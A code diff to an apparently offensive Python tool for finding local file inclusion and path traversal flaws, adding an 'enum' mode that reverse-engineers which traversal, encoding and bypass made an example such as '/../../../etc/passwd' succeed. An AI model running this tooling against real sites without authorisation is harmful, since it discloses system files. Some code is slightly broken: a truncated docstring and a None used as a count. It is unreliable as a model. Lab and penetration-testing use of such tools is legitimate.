@@ -81,11 +81,14 @@ target_system_help = (f'List of attributes of the target system, to help choose 
 parser.add_argument('mode', choices=['filter', 'scan', 'enum', 'batch'], help=mode_help)
 parser.add_argument('--version', action='version', version=f'%(prog)s {version_number}')
 parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', help='Show extra output to console. Does not affect log file verbosity.')
+parser.add_argument('-u', '--url', dest='url', help='Base URI of the target. Ex. "http://mywebsite.htb/index.php?page="', type=str, required=True)
 
 scan_group = parser.add_argument_group('scan', 'Arguments for "scan" mode')
-scan_group.add_argument('-u', '--url', dest='url', help='Base URI of the target. Ex. "http://mywebsite.htb/index.php?page="', type=str, required=True)
 scan_group.add_argument('--min', dest='min', help='Minimum number of steps "back" to traverse.', type=int, default=1)
 scan_group.add_argument('--max', dest='max', help='Maximum number of steps "back" to traverse.', type=int, default=10)
+
+enum_group = parser.add_argument_group('enum', 'Arguments for "enum" mode')
+enum_group.add_argument('-ex', '--example-lfi', dest='example_lfi', help='Example of a URL that successfully discloses a local file (the bold part of the output of "scan" mode) Ex. "/../../../etc/passwd"', type=str, required=True)
 
 parser.add_argument('--target_system', dest='target_system', help=target_system_help, type=str, default='any')
 parser.add_argument('-t', '--threads', dest='threads', help='Number of threads to use for processing.', type=int, default=40)
@@ -844,6 +847,63 @@ def scan():
     return concurrent_async_requests(job_queue, exit_early=True, ignore_filters=False)
 
 
+def parse_lfi_url(successful_example_lfi):
+    """
+    Figure out what type of traversal, encodings, etc were used to produce the example lfi.
+    Do this by com
+    :param successful_example_lfi: An example LFI that already works. I.e. the output of "scan" mode: args.example_lfi
+    :return: a dictionary representing a Job that performs the LFI.
+    """
+    idx = 0
+    for depth in range(args.min, args.max + 1):
+        for target_file in [f for f in files_to_test if 'variables' not in f]:
+            filepath = target_file.get('path')
+            # Trim off the leading slash from the filepath, if one is present
+            if filepath.startswith('/') and len(filepath) > 1:
+                filepath = filepath[1:]
+            for slash in ['', '/']:
+                for traversal in traversals:
+                    for ending in endings:
+                        base_resource = f'{slash}{depth * traversal}{filepath}{ending}'
+                        for _mutation in mutations:
+                            for _bypass in bypasses:
+                                modified_resource = _bypass(_mutation(base_resource))
+                                url = args.url + modified_resource
+                                if successful_example_lfi == modified_resource:
+                                    return {
+                                        "filepath": target_file.get('path'),
+                                        "traversal": traversal,
+                                        "depth": depth,
+                                        "leading_slash": (slash == '/'),
+                                        "ending": ending,
+                                        "mutation": _mutation.__name__,
+                                        "bypass": _bypass.__name__,
+                                        "url": url,
+                                        "idx": idx
+                                    }
+                                idx += 1
+    return None
+
+
+def enum(example_job):
+    """
+    Perform enumeration mode. Start with an example URL and figure out what traversal, encoding, and bypass was used
+    """
+    if example_job is None:
+        if args.colorless:
+            print(f"{' '*64}\n[-] No LFI parameters were found that successfully reproduce the provided \"example-lfi\":\n\n"
+                  f"    {args.example_lfi}\n"
+                  f"Please use the output of \"scan\" mode as an example, or at least use a successful LFI "
+                  f"for one of the files already defined in file-list.json\n")
+        else:
+            print(
+                f"{' ' * 64}\n{colors.RED}[-] No LFI parameters were found that successfully reproduce the provided \"example-lfi\":\n\n"
+                f"{colors.END}    {args.example_lfi}\n\n"
+                f"{colors.RED}Please use the output of \"scan\" mode as an example, or at least use a successful LFI "
+                f"for one of the files already defined in file-list.json\n{colors.END}")
+        sys.exit(1)
+    print(json.dumps(example_job, sort_keys=True, indent='    '))
+
 def concurrent_async_requests(job_queue, exit_early, ignore_filters):
     """
     Issue requests concurrently. Use up to the defined number of threads. SIGINT will terminate
@@ -961,8 +1021,10 @@ def scan_report():
                     print(f"{' '*64}\n[+] LFI discovered for file: {filepath} in {len(successful_jobs)} way(s)"
                           f" (See below for one example)\n    {successful_jobs[shortest_job_idx]['url']}")
                 else:
+                    bolded_url = (args.url + colors.BOLD + colors.GREEN +
+                                  successful_jobs[shortest_job_idx]['url'][len(args.url):] + colors.END + colors.UNBOLD)
                     print(f"{' '*64}\n{colors.GREEN}[+] LFI discovered for file: {filepath} in {len(successful_jobs)} way(s){colors.END}"
-                          f" (See below for one example)\n    {successful_jobs[shortest_job_idx]['url']}")
+                          f" (See below for one example)\n    {bolded_url}")
     else:
         if args.colorless:
             print(f"{' ' * 64}\n[-] Failed to locate any LFI using the provided parameters")
@@ -1001,6 +1063,14 @@ def main():
         elapsed = end_time - start_time
         print(f"\nScan complete: {max_request_index+1}/{n} requests in {elapsed:.1f}s ({(max_request_index+1)/elapsed:.0f} req/s)")
         scan_report()
+
+    if args.mode == "enum":
+        start_time = time.time()
+        example_job = parse_lfi_url(args.example_lfi)
+        n = enum(example_job)
+        end_time = time.time()
+        elapsed = end_time - start_time
+        print(f"\nEnumeration complete: {max_request_index + 1}/{n} requests in {elapsed:.1f}s ({(max_request_index + 1) / elapsed:.0f} req/s)")
 
 
 if __name__ == "__main__":
